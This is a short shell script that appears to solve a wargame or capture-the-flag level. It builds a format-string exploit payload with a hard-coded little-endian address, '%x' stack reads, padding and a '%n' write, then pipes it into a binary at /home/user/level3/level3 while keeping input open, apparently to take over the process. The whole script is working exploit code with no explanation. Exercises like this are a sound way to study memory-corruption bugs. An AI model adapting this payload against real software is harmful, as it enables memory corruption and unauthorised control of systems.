#!/bin/sh

# REQUIREMENTS:
# Python must be installed
# Must be on a x86, 32bit Linux architecture.

ADDRESS_LITTLE_ENDIAN="\x8c\x98\x04\x08"

MULTIPLIER=38

if [ ! -z "$1" ]; then
  MULTIPLIER=$1
fi

echo $(python -c "print('\x8c\x98\x04\x08' + '%x ' * 3 + 'A' * $MULTIPLIER + '%n')") > /tmp/payload

cat /tmp/payload - | /home/user/level3/level3
rm /tmp/payload